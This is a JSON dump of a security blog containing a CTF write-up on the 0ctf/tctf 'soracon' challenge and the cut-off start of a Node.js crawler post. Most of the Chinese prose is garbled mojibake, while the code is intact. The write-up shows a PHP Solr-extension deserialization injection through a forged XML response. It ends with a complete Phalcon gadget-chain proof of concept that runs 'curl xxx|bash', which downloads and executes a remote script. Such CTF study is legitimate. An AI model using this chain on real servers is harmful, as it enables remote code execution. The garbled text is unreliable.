{"meta":{"title":"byc_404's blog","subtitle":"","description":"","author":"byc_404","url":"https://www.bycsec.top","root":"/"},"pages":[{"title":"404 Not Found","date":"2021-02-17T15:07:44.271Z","updated":"2020-05-05T07:48:12.000Z","comments":true,"path":"404.html","permalink":"https://www.bycsec.top/404.html","excerpt":"","text":"404 å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"å…³äºè‡ªå·±","date":"2020-12-16T06:22:56.150Z","updated":"2020-12-16T06:22:56.150Z","comments":true,"path":"about/index.html","permalink":"https://www.bycsec.top/about/index.html","excerpt":"","text":"ctf web dog byc_404@X1cT34m å‘å¾€æ¸—é€æµ‹è¯•/å®‰å…¨ç ”ç©¶ï¼Œä¹Ÿå¾ˆå–œæ¬¢ä»£ç å®¡è®¡ Node.js &gt;&gt; php ç»ä¸æ°çƒ‚é’±ï¼Œæ¢¦æƒ³èƒ½åšå–œæ¬¢æ–¹å‘çš„å®‰å…¨ç ”ç©¶,èƒ½å¤šä¼šäº›å¼€å‘å°±å¥½äº† ç›®å‰æš‚æ—¶é€€å½¹ï¼Œæœ‰ç¼˜å†è§å•¦"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2021-02-17T15:06:50.387Z","updated":"2021-02-17T15:06:50.387Z","comments":true,"path":"categories/index.html","permalink":"https://www.bycsec.top/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-17T15:06:25.032Z","updated":"2020-05-05T07:38:08.000Z","comments":true,"path":"mylist/index.html","permalink":"https://www.bycsec.top/mylist/index.html","excerpt":"","text":""},{"title":"å‹é“¾","date":"2021-02-17T15:40:15.152Z","updated":"2021-02-17T15:40:15.152Z","comments":true,"path":"friends/index.html","permalink":"https://www.bycsec.top/friends/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2020-11-05T09:04:26.385Z","updated":"2020-05-05T13:14:46.000Z","comments":true,"path":"tags/index.html","permalink":"https://www.bycsec.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"0ctf/tctf-soracon","slug":"0ctf-tctf-soracon","date":"2021-07-06T16:11:05.000Z","updated":"2021-07-06T16:14:41.855Z","comments":true,"path":"2021/07/07/0ctf-tctf-soracon/","link":"","permalink":"https://www.bycsec.top/2021/07/07/0ctf-tctf-soracon/","excerpt":"è¿™æ¬¡0ctf/tctf æŠ½ç©ºçœ‹äº†ä¸‹soraconè¿™é¢˜ã€‚æœ€ç»ˆè¿˜æ˜¯éå¸¸å¯æƒœï¼Œå¯èƒ½æœ‰å¤šç‚¹æ—¶é—´åšé¢˜å°±èƒ½è§£å‡ºäº†ã€‚ä¸‹é¢æ˜¯è‡ªå·±çš„ä¸€ä¸ªæ€è·¯æµç¨‹ã€‚","text":"è¿™æ¬¡0ctf/tctf æŠ½ç©ºçœ‹äº†ä¸‹soraconè¿™é¢˜ã€‚æœ€ç»ˆè¿˜æ˜¯éå¸¸å¯æƒœï¼Œå¯èƒ½æœ‰å¤šç‚¹æ—¶é—´åšé¢˜å°±èƒ½è§£å‡ºäº†ã€‚ä¸‹é¢æ˜¯è‡ªå·±çš„ä¸€ä¸ªæ€è·¯æµç¨‹ã€‚ ï¼ˆä»€ä¹ˆæ—¶å€™æ‰èƒ½åšå‡ºzsxçš„é¢˜å‘¢ vulné¢˜ç›®ç»™å‡ºäº†æºç  12345678910&lt;?phphighlight_file(__FILE__);$host = $_GET['host'] ?? '127.0.0.1';$options = ['hostname' =&gt; $host, 'port' =&gt; 8983, 'path' =&gt; '/solr'];$client = new SolrClient($options);$query = new SolrQuery();$query-&gt;setQuery('lucene');$query_response = $client-&gt;query($query);$response = $query_response-&gt;getResponse();print_r($response); è¿™é‡Œç”¨åˆ°çš„SolrClientç­‰ç­‰ç±»è¯´æ˜ç”¨åˆ°äº†php çš„solræ‰©å±•ã€‚ä¸€èˆ¬æ˜¯ç›´æ¥peclå®‰è£…å³å¯ï¼Œæˆ‘æ˜¯windowsç¯å¢ƒæ‰€ä»¥å°±ç›´æ¥ä¸Špecl ä¸‹ä¸€ä»½æºç ï¼Œä¸‹ä¸€ä»½ç¼–è¯‘å¥½çš„dllã€‚ è¿™é‡ŒåŸæœ¬æ˜¯æ‰“ç®—è‡ªå·±ç¼–è¯‘ä¸€ä»½dllçœ‹çœ‹è¦ä¸è¦åŠ¨æ€è°ƒè¯•çš„ã€‚ä½†æ˜¯å®é™…ä¸Šæ¼æ´ç‚¹å¯ä»¥ç›´æ¥é™æ€çœ‹å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘å°±æ²¡æœ‰å¦å¤–ç¼–è¯‘äº†ã€‚ å…³äºsolrè‡ªå·±å…¶å®ä»¥å‰æ²¡æœ‰çœ‹è¿‡ç›¸å…³æ¼æ´ï¼Œæ‰€ä»¥å»æ–°å®‰è£…äº†ä¸‹ï¼Œæœ¬åœ°å¯ä»¥ç›´æ¥solr start -e cloudèµ·ã€‚ è¿™é‡Œè™½ç„¶ä¸èƒ½ç›´æ¥çœ‹æ‡‚é¢˜ç›®æºç çš„å…·ä½“ç›®çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œå¯æ§ç‚¹åªæœ‰hostã€‚ä¹Ÿå°±æ˜¯è¯´response æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬ä»response å…¥æ‰‹ æˆ‘ä»¬ç›´æ¥æ‰¾getResponse,å‘ç°èµ·è°ƒç”¨çš„æ˜¯æ¥å£solr_response_get_response_impl è¿™é‡Œçš„php_var_unserializeä»£è¡¨ï¼Œè¿™é‡Œå¯¹responseæ‰§è¡Œäº†ååºåˆ—åŒ–ã€‚è¾“å…¥æ˜¯ç¬¬äºŒä¸ªå‚æ•°raw_responseã€‚è¿™ä¸ªå°±éå¸¸æœ‰æ„æ€äº†ã€‚æˆ‘ä»¬çš„responseä½œä¸ºå¯æ§å‚æ•°çš„è¯ï¼Œå¦‚æœèƒ½åˆ©ç”¨ååºåˆ—åŒ–å¿…ç„¶æ˜¯å¯ä»¥æ‰©å¤§æ”»å‡»é¢ã€‚é‚£ä¹ˆå›æº¯çœ‹ä¸‹è¿™é‡Œçš„å‚æ•°raw_response èƒ½å¦æ§åˆ¶ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ååºåˆ—åŒ–ã€‚ é¦–å…ˆï¼Œå¯ä»¥å‘ç°ï¼Œraw_response æ¥è‡ªbufferã€‚raw_resp = (unsigned char *) buffer.str;è€Œbufferåˆ™æ˜¯æ ¹æ®ifæ¡ä»¶ï¼Œæœ‰å¤šç§ä¸åŒæ–¹å¼å¤„ç†å¾—åˆ°çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344if (Z_STRLEN_P(response_writer))&#123; if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_XML_RESPONSE_WRITER)) &#123; /* SOLR_XML_RESPONSE_WRITER */ /* Convert from XML serialization to PHP serialization format */ solr_encode_generic_xml_response(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response), Z_LVAL_P(parser_mode)); if(return_array) &#123; solr_sobject_to_sarray(&amp;buffer); &#125; &#125; else if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_PHP_NATIVE_RESPONSE_WRITER) || 0 == strcmp(Z_STRVAL_P(response_writer), SOLR_PHP_SERIALIZED_RESPONSE_WRITER)) &#123; /* SOLR_PHP_NATIVE_RESPONSE_WRITER */ /* Response string is already in Native PHP serialization format */ solr_string_set(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response)); if(!return_array) &#123; solr_sarray_to_sobject(&amp;buffer); &#125; &#125; else if (0 == strcmp(Z_STRVAL_P(response_writer), SOLR_JSON_RESPONSE_WRITER)) &#123; int json_translation_result = solr_json_to_php_native(&amp;buffer, Z_STRVAL_P(raw_response), Z_STRLEN_P(raw_response)); /* SOLR_JSON_RESPONSE_WRITER */ /* Convert from JSON serialization to PHP serialization format */ if (json_translation_result &gt; 0) &#123; solr_throw_exception_ex(solr_ce_SolrException, SOLR_ERROR_1000, SOLR_FILE_LINE_FUNC, solr_get_json_error_msg(json_translation_result)); php_error_docref(NULL, E_WARNING, \"Error in JSON-&gt;PHP conversion. JSON Error Code %d\", json_translation_result); &#125; if(!return_array) &#123; solr_sarray_to_sobject(&amp;buffer); &#125; &#125;&#125; ä½†æ˜¯å…¶å®æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ ¹æ®æœ¬åœ°æŠ¥é”™ï¼Œç›´æ¥ç¡®å®šå°±æ˜¯ç¬¬ä¸€ä¸ªifã€‚æ¯”å¦‚æˆ‘è¿œç¨‹èµ·äº†ä¸€ä¸ªnodeä½œä¸ºhttp server 123456789const express = require('express');const app = express();const logger = require('morgan');app.use(logger('dev'))app.post('/solr/*', (req, res) =&gt; res.send('233'));app.listen(8983) å›æ˜¾ ä»error loading root of xmlåŸºæœ¬å¯ä»¥ç¡®å®šï¼ŒæœŸæœ›çš„å›æ˜¾è‚¯å®šæ˜¯xmlæ ¼å¼ã€‚è€Œä¸”åç»­çš„error unserializing ä¹ŸåŸºæœ¬ç¡®å®šå…¶ä¸­ä¼šå‘ç”Ÿååºåˆ—åŒ–ã€‚ é‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›ç¬¬ä¸€ä¸ªifä¸­çš„solr_encode_generic_xml_response å‘ç°æœ‰æˆ‘ä»¬åˆšåˆšçš„æŠ¥é”™ä¿¡æ¯ã€‚å¯ä»¥ç¡®è®¤æ˜¯è¿™ä¸ªåˆ†æ”¯äº†ã€‚æ¥ä¸‹æ¥è·Ÿè¿›solr_encode_object è¿™é‡Œä¸å¦¨çœ‹ä¸‹solr_write_object_opener å…¶å®æ¼æ´ç‚¹åˆ°è¿™é‡Œå°±æœ‰é›å½¢äº†ã€‚æ­¤å¤„openerè¿™ä¸ªå‡½æ•°æ˜æ˜¾æ˜¯åœ¨å¾€bufferé‡Œå†™åºåˆ—åŒ–æ•°æ®å­—ç¬¦ä¸²ã€‚å®é™…ä¸Šï¼Œä¸Šé¢çš„encode_xml_nodeä»¥åŠobject_closerè·Ÿè¿›å»ä¹Ÿä¼šå‘ç°ï¼Œæ˜¯ä¸€æ ·çš„æ€è·¯ã€‚ æ—¢ç„¶ä»–çš„åºåˆ—åŒ–æ•°æ®æ˜¯ä¸€æ®µæ®µæ‹¼æ¥è€Œæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å¯æ§æ•°æ®è‡ªç„¶ä¹Ÿä½œä¸ºå…¶ä¸­ä¸€éƒ¨åˆ†è¢«æ‹¼æ¥è¿›å»äº†ï¼Œæœ€åæ‰§è¡Œååºåˆ—åŒ–ã€‚ç„¶è€Œæˆ‘ä»¬çŸ¥é“ï¼Œphpä¸­åºåˆ—åŒ–æ•°æ®åªè¦æ»¡è¶³æ­£ç¡®æ ¼å¼é—­åˆå…³ç³»ï¼Œæ˜¯å¯ä»¥é€šè¿‡æå‰é—­åˆæ¥å®ç°ååºåˆ—åŒ–é€ƒé€¸çš„ã€‚è¿™ä¸ªä¸å¿…å¤šè¯´ã€‚ è¿™é‡Œåé¢ä¹Ÿå¯ä»¥è·Ÿä¸‹solr_encode_xml_node.ä¹Ÿä¼šå‘ç°å…¶å®å°±æ˜¯åœ¨æ ¹æ®xml nodeçš„ç±»å‹æ¥é€‰æ‹©ä¸åŒå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536#define solr_encode_xml_node(__node, __buf, __enc_type, __arr_idx, __mode) solr_encoder_functions[solr_get_xml_type((__node))]((__node),(__buf), (__enc_type), (__arr_idx), (__mode))......static solr_php_encode_func_t solr_encoder_functions[] = &#123; solr_encode_string, solr_encode_null, solr_encode_bool, solr_encode_int, solr_encode_float, solr_encode_string, solr_encode_array, solr_encode_object, solr_encode_document, solr_encode_result, NULL&#125;;......static inline int solr_get_xml_type(xmlNode *node)&#123; solr_char_t *node_name = (solr_char_t *) node-&gt;name; if (!node_name) &#123; return SOLR_ENCODE_STRING; &#125; if (!strcmp(node_name, \"str\")) &#123; return SOLR_ENCODE_STRING; &#125; ...... æ¥ä¸‹æ¥æœ¬åœ°æ¨¡æ‹Ÿä¸‹ã€‚é¦–å…ˆphpä»£ç é€‰é¡¹åŠ ä¸Šproxy,æŠ“åŒ…çœ‹ä¸‹å›æ˜¾(è¿™é‡Œsolrå·²ç»æ–°å»ºäº†ä¸€ä¸ªcore bycäº†) 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;response&gt;&lt;lst name=\"responseHeader\"&gt; &lt;bool name=\"zkConnected\"&gt;true&lt;/bool&gt; &lt;int name=\"status\"&gt;0&lt;/int&gt; &lt;int name=\"QTime\"&gt;12&lt;/int&gt; &lt;lst name=\"params\"&gt; &lt;str name=\"q\"&gt;lucene&lt;/str&gt; &lt;str name=\"indent\"&gt;on&lt;/str&gt; &lt;str name=\"version\"&gt;2.2&lt;/str&gt; &lt;str name=\"wt\"&gt;xml&lt;/str&gt; &lt;/lst&gt;&lt;/lst&gt;&lt;result name=\"response\" numFound=\"0\" start=\"0\" maxScore=\"0.0\" numFoundExact=\"true\"&gt;&lt;/result&gt;&lt;/response&gt; æ„Ÿè§‰è·Ÿè¿œç¨‹å·®çš„æœ‰ç‚¹å¤šã€‚ä½†æ˜¯æ ¼å¼æ˜¯æ¸…æ™°çš„ã€‚æ¯”å¦‚ç±»å‹ï¼Œåå­—éƒ½å¯ä»¥å¯¹åº”ã€‚æˆ‘ä»¬æŒ‰ç…§è¿™ä¸ªï¼Œä»¥åŠè¿œç¨‹çš„å›æ˜¾æ ¼å¼å…¶å®å°±å¯ä»¥æ„é€ ä¸€ä¸ªresponseäº†ã€‚ æœ¬åœ°æµ‹è¯•ï¼Œå‡†å¤‡ä¸€ä¸ªæ¶æ„ç±»Evilã€‚destructé‡Œæ”¾ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚ 12345class Evil &#123; public function __destruct() &#123; system(\"whoami\"); &#125;&#125; å›æ˜¾è®¾ç½®é‡Œæ’å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®O:4:&quot;Evil&quot;:0:{}ã€‚ç„¶ååé¢é—­åˆ5ä¸ªæ‹¬å·ï¼Œè¿™ä¸ªæ˜¯ç›´æ¥fuzzå‡ºæ¥çš„ã€‚ 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;response&gt;&lt;result name=\"response\" numFound=\"1\" start=\"0\" numFoundExact=\"true\"&gt; &lt;doc name=\"byc\"&gt; &lt;int name=\"a\"&gt;123456;i:1;O:4:\"Evil\":0:&#123;&#125;&#125;&#125;&#125;&#125;&#125;&lt;/int&gt; &lt;str name=\"q\"&gt;lucene&lt;/str&gt; &lt;/doc&gt;&lt;/result&gt;&lt;/response&gt; è¿˜æ˜¯ç”¨åˆšåˆšçš„node serverã€‚æœ¬åœ°çœ‹ä¸‹ç»“æœ å‘ç°å¯ä»¥è§¦å‘ååºåˆ—åŒ–ã€‚åˆ°æ­¤ä¸ºæ­¢ï¼Œè¿™é“é¢˜çš„æ¼æ´éƒ¨åˆ†å°±å·²ç»åˆ†æå®Œäº†ã€‚ gadgetç„¶åå°±æ˜¯å¦‚ä½•åœ¨é¢˜ç›®è¿œç¨‹æ‰¾åˆ°è§¦å‘ååºåˆ—åŒ–çš„é—®é¢˜äº†ã€‚ç„¶è€Œè‡ªå·±ä¸€æ–¹é¢æ²¡çœ‹åˆ°é¢˜ç›®ç»™çš„phpinfo.phpï¼Œå¦ä¸€æ–¹é¢æ²¡æ—¶é—´çœ‹é¢˜ã€‚ã€‚ã€‚æ‰€ä»¥å½“æ—¶ç›´æ¥æ”¾å¼ƒäº†ã€‚åæ¥çœ‹é¢˜è§£çš„é“¾å­ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰äº›éš¾åº¦çš„ã€‚ æ³¨æ„åˆ°æ‰©å±•è¿™é‡Œçš„phalcon, æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æºç cphalconã€‚ä¼šå‘ç°å…¶æºç éƒ½æ˜¯.zepæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç¼–è¯‘æˆcåä½œä¸ºæ‰©å±•ä½¿ç”¨ã€‚ä½†æ˜¯æ•´ä½“é£æ ¼è·Ÿphpå·®ä¸å¤šã€‚æ‰€ä»¥ç›´æ¥æ‰‹åŠ¨å®¡å°±è¡Œäº†ã€‚ å…¥å£æ˜¯ä¸ªæŠ½è±¡ç±»AbstractAdapteråç»­æ ¹æ®defaultFormatterè°ƒç”¨commitæ–¹æ³•ã€‚è¿™é‡Œå¯ä»¥æ‰¾åˆ°å®ç°è¿™ä¸ªæŠ½è±¡ç±»çš„Streamç±»ã€‚ä½œä¸ºæˆ‘ä»¬payloadå®ä¾‹åŒ–çš„å¯¹è±¡ã€‚ç„¶åä¼šå‘ç°æœ€ç»ˆè°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨å…¶processæ–¹æ³•ã€‚ æ‰€ä»¥å¦‚æœèƒ½æŠŠmessageæ§ä½ï¼Œè¿™é‡Œå°±æœ‰ä¸ªä»»æ„æ–‡ä»¶å†™ã€‚æˆ‘ä»¬å›åˆ°æŠ½è±¡ç±»çœ‹ä¸‹getFornatedItemå‘ç°ä¼šå®ä¾‹åŒ–ä¸€ä¸ªLogger\\Formatterä¸‹çš„ç±»ä½œä¸ºformater,è°ƒç”¨å…¶formatæ–¹æ³•ã€‚ä»¥Jsonä¸ºä¾‹ åšåˆ°äº†è°ƒç”¨å¯æ§å‚æ•°çš„getTime()æ–¹æ³•ã€‚æ­¤æ—¶å¸¸è§çš„ä¸€ä¸ªæ€è·¯å°±æ˜¯å…¨å±€æ‰¾__callæ‰©å±•åˆ©ç”¨é“¾ã€‚ è¿™é‡Œåæ¥çœ‹äº†ä¸‹zsxçš„é“¾è·ŸNu1Lçš„é“¾ã€‚å…¶å®éƒ½ç”¨äº†åŒä¸€ä¸ª__call çœ‹åˆ°Di.zep 123456789101112131415161718public function __call(string! method, array arguments = []) -&gt; var | null&#123; var instance, possibleService, definition; /** * If the magic method starts with \"get\" we try to get a service with * that name */ if starts_with(method, \"get\") &#123; let possibleService = lcfirst(substr(method, 3)); if isset this-&gt;services[possibleService] &#123; let instance = this-&gt;get(possibleService, arguments); return instance; &#125; &#125;...... è¿™ä¸ªä½¿ç”¨æŒºå¸¸è§çš„ï¼Œä¸€èˆ¬å¸¸è§äºå¤„ç†getterï¼Œsetterå‹çš„æ–¹æ³•ã€‚é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬æ§åˆ¶ä½servicesæ•°ç»„ã€‚å°±èƒ½è°ƒç”¨å…¶getæ–¹æ³•ã€‚getæ–¹æ³•çš„æ ¸å¿ƒåœ¨ å…¨å±€æ‰¾ä¼šå‘ç°ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„resolveã€‚å³\\Diä¸‹çš„Serviceç±»resolveæ–¹æ³•ã€‚resolveæ–¹æ³•ã€‚æˆ‘ä»¬é¦–å…ˆæ³¨æ„åˆ°definitionå¯æ§ã€‚å¦‚æœæ˜¯å­—ç¬¦ä¸²çš„è¯ï¼Œå¯ä»¥å®ä¾‹åŒ–ç±»ã€‚ å¦‚æœæ˜¯å…¶ä»–çš„è¯ï¼Œä¼šè°ƒç”¨builderæ¥build åˆ°è¿™é‡Œæˆ‘çœ‹äº†ä¸‹ï¼ŒNu1Lè·Ÿzsxçš„é“¾å­å°±æœ‰å·®åˆ«äº†ã€‚Nu1Lé€‰æ‹©èµ°ä¸Šé¢ï¼Œ å¯ä»¥åšåˆ°å®ä¾‹åŒ–ä¸€ä¸ªç±»ä¸”æ„é€ æ–¹æ³•å‚æ•°å¯æ§ã€‚ç„¶ååé¢ä»£ç éƒ½ä¸æ‰§è¡Œç›´æ¥è¿”å›äº†ã€‚ zsxæ˜¯å•çº¯å®ä¾‹åŒ–ä¸€ä¸ªç±»ã€‚ç„¶åç»§ç»­èµ°ä¸‹é¢ã€‚ buildæ–¹æ³•ä¸‹é¢çš„å…³é”®ä»£ç å°±åœ¨ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253for methodPosition, method in paramCalls &#123; /** * The call parameter must be an array of arrays */ if unlikely typeof method != \"array\" &#123; throw new Exception( \"Method call must be an array on position \" . methodPosition ); &#125; /** * A param 'method' is required */ if unlikely !fetch methodName, method[\"method\"] &#123; throw new Exception( \"The method name is required on position \" . methodPosition ); &#125; /** * Create the method call */ let methodCall = [instance, methodName]; if fetch arguments, method[\"arguments\"] &#123; if unlikely typeof arguments != \"array\" &#123; throw new Exception( \"Call arguments must be an array \" . methodPosition ); &#125; if count(arguments) &#123; /** * Call the method on the instance */ call_user_func_array( methodCall, this-&gt;buildParameters(container, arguments) ); /** * Go to next method call */ continue; &#125; &#125; /** * Call the method on the instance without arguments */ call_user_func(methodCall);&#125; ç”±äºæˆ‘ä»¬ä¸Šé¢instanceå¯æ§ã€‚è¿™ä¸ªä»£ç å—é‡ŒmethodCall,this-&gt;buildParameters(container, arguments)è·Ÿè¿›çœ‹çš„è¯å…¶å®éƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥ç›¸å½“äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªcreate_instanceå®ä¾‹åŒ–çš„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä¸”å‚æ•°å¯æ§ã€‚ è¿™é‡Œzsxçš„é“¾å­æ˜¯ï¼Œcreate_instanceå®ä¾‹åŒ–ä¸€ä¸ªValidationç±»ã€‚ç„¶åè°ƒç”¨addæ–¹æ³•è®¾ç½®å¥½è¿™ä¸ªValidationçš„validatorã€‚ç„¶åæ³¨æ„åˆ°ä¸Šé¢for methodPosition, method in paramCallsæ˜¯å¾ªç¯è°ƒç”¨çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¿˜èƒ½å†è°ƒç”¨åŒä¸€ä¸ªinstanceçš„å¦ä¸€ä¸ªæ–¹æ³•ã€‚æ­¤å¤„å³validateæ–¹æ³•ã€‚ è¿™ä¸ªæ–¹æ³•å¦™åœ¨ï¼Œä¸Šé¢å®ä¾‹åŒ–æ—¶ï¼Œè™½ç„¶ç±»çš„å‚æ•°æ²¡æœ‰è®¾ç½®ä¸ºå¯æ§å€¼ã€‚ä½†æ˜¯ç”±äºåŒä¸€ä¸ªinstanceå¾ªç¯è°ƒç”¨è¿™ç‚¹ï¼Œå°±å¯ä»¥å…ˆè°ƒç”¨addæ–¹æ³•è®¾ç½®å¥½å‚æ•°ï¼Œå†è°ƒç”¨validateæ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œvalidatoræ˜¯ç”¨çš„Callback callbackå®Œå…¨å¯æ§ã€‚ä¸è¿‡è¿™é‡Œzsxçš„å‚æ•°æ˜¯ç”¨\\Phalcon\\Acl\\Component()æ§ä½çš„ã€‚å…¶å®æ˜¯å› ä¸ºvalidateæ–¹æ³•åªæ¥æ”¶æ•°ç»„æˆ–å¯¹è±¡ä½œå‚æ•°ã€‚é‚£ä¹ˆæ‰¾ä¸€ä¸ª__toStringå°±è¡Œäº†ã€‚ poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;?phpnamespace Phalcon\\Acl;class Component &#123; public $name = \"curl xxx|bash\";&#125;namespace Phalcon\\Validation\\Validator;class Callback &#123; public $options = [ \"message\" =&gt; \"\", \"callback\" =&gt; \"system\" ];&#125;namespace Phalcon\\Di;class Service &#123; public $definition; public $resolved = false; public $shared = false; public $sharedInstance = null; public $eventsManager = null; public function __construct($definition) &#123; $this-&gt;definition = $definition; &#125;&#125;namespace Phalcon;class Di &#123; public $services; public function __construct($services) &#123; $this-&gt;services = $services; &#125;&#125;namespace Phalcon\\Logger\\Adapter;abstract class AbstractAdapter &#123; public $defaultFormatter= \"Json\"; public $formatter; public $inTransaction = true; public $queue;&#125;class Stream extends AbstractAdapter &#123; public $handler = null; public $mode = \"ab\"; public $name = \"/tmp/byc\"; public function __construct($queue) &#123; $this-&gt;queue = $queue; &#125;&#125;$poc = new Stream([ new \\Phalcon\\Di([ \"context\"=&gt; new \\Phalcon\\Di\\Service([ \"className\" =&gt; \"Phalcon\\Validation\", \"arguments\" =&gt; [], \"calls\" =&gt; [ [ \"method\" =&gt; \"add\", \"arguments\" =&gt; [ [ \"type\" =&gt; \"parameter\", \"value\" =&gt; [\"\"] ], [ \"type\" =&gt; \"parameter\", \"value\" =&gt; new \\Phalcon\\Validation\\Validator\\Callback() ] ] ], [ \"method\" =&gt; \"validate\", \"arguments\" =&gt; [ [ \"type\" =&gt; \"parameter\", \"value\" =&gt; new \\Phalcon\\Acl\\Component() ] ] ] ] ]) ])]);echo (serialize($poc)); è¿˜æœ‰Nu1Lçš„æ–¹æ³•ã€‚æ•´ä½“ä¸Šå…¶å®æ¯”è¾ƒå¥½æƒ³ã€‚å› ä¸ºå‰é¢å·²ç»æœ‰ä¸€ä¸ªfwriteäº†ã€‚æ§åˆ¶ä½å‚æ•°å°±èƒ½ä»»æ„å†™ã€‚ç„¶åå¦‚æœæœ‰æ–‡ä»¶åŒ…å«å°±èƒ½rceäº†ã€‚ è¿™ä¸ªç±»ç›´æ¥æ„é€ æ–¹æ³•å°±èƒ½æ–‡ä»¶åŒ…å«ã€‚æ‰€ä»¥åˆ°ä¸Šé¢é‚£æ­¥create_instanceå°±å¯ä»¥åŒ…å«äº†ã€‚ å†™æ–‡ä»¶çš„è¯æ›´ç®€å•ã€‚åœ¨formaté‚£ä¸ç”¨è§¦å‘__callã€‚ç›´æ¥æ§åˆ¶å¥½é‡Œé¢å„ä¸ªæ–¹æ³•å‚æ•°å°±èƒ½ç›´æ¥fwriteã€‚ Summary æ¯”èµ›æœ‰æ—¶é—´è‚è¿™é¢˜çš„è¯ï¼Œåº”è¯¥æ”¶è·æŒºå¤§çš„ã€‚ã€‚ã€‚ å…¶ä»–é¢˜è´¨é‡ä¹Ÿéå¸¸ä¸é”™ï¼Œæ¯”å¦‚2ä¸ªjavaã€‚å¸Œæœ›æœ‰æœºä¼šèƒ½çœ‹åˆ°wuyxå¸ˆå‚…è·Ÿcclå¸ˆå‚…æ”¾å‡ºå®Œæ•´é¢˜è§£~","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"ä½¿ç”¨Node.jså®ç°åŠ¨æ€çˆ¬è™«","slug":"ä½¿ç”¨Node-jså®ç°åŠ¨æ€çˆ¬è™«","date":"2021-06-06T12:44:20.000Z","updated":"2021-06-08T13:41:38.799Z","comments":true,"path":"2021/06/06/ä½¿ç”¨Node-jså®ç°åŠ¨æ€çˆ¬è™«/","link":"","permalink":"https://www.bycsec.top/2021/06/06/%E4%BD%BF%E7%94%A8Node-js%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E7%88%AC%E8%99%AB/","excerpt":"æœ¬æ–‡æ˜¯å…³äºè‡ªå·±ç”¨Node.jså®ç°åŠ¨æ€çˆ¬è™«çš„ä¸€äº›è®°å½•ä»¥åŠè¸©å‘ã€‚","text":"æœ¬æ–‡æ˜¯å…³äºè‡ªå·±ç”¨Node.jså®ç°åŠ¨æ€çˆ¬è™«çš„ä¸€äº›è®°å½•ä»¥åŠè¸©å‘ã€‚ èµ·æ‰‹å¼ ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯çˆ¬è™«çš„è¯­è¨€é€‰æ‹©ã€‚æ ¹æ®ä¸ªäººå–œå¥½ä»¥åŠä¹‹å‰å†™è¿‡çš„å¾ˆå¤šdemoï¼Œç¼–ç¨‹è¯­è¨€ä»¥åŠæ¨¡å—æ¯‹åº¸ç½®ç–‘æ˜¯é€‰ç”¨å½“å‰æœ€å¥½çš„headless Chrome jsä¾èµ–puppeteeräº†,åœ¨æ­¤ä¹‹ä¸Šè€ƒè™‘å¹¶å‘é—®é¢˜æ‰€ä»¥é€‰ç”¨puppeteer-cluster. puppeteerçš„æ“ä½œä¸€èˆ¬éƒ½æ˜¯åŸºäºåŠŸèƒ½å¼ºå¤§çš„pageæ¥æ“ä½œçš„ã€‚ä¸€äº›å¸¸è§çš„apiå¦‚$,$$(ç›¸å½“äºquerySelector,querySelectorAll),evaluateç­‰åŸºæœ¬ä¿è¯æˆ‘ä»¬å¿«é€Ÿå®ç°å®šä½å…ƒç´ ä»¥åŠåœ¨æµè§ˆå™¨çš„contextä¸‹æ‰§è¡Œjavascript çš„åŠŸèƒ½ã€‚è¿™æ¬¡å†™çš„æ—¶å€™è¿˜å¦å¤–æ³¨æ„åˆ°åŸæ¥ElementHandleç±»(å³ä½¿ç”¨$,$$å¾—åˆ°çš„node)ä¹Ÿå¯ä»¥ç›´æ¥evaluate,è¿™æ ·å°±èŠ‚çœäº†å¾ˆå¤šä¸å¿…è¦çš„æ“ä½œã€‚ ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼Œæˆ‘å†™è¿™ä¸ªçˆ¬è™«å¸Œæœ›è¾¾åˆ°çš„æ•ˆæœæ˜¯ä»€ä¹ˆ(å› 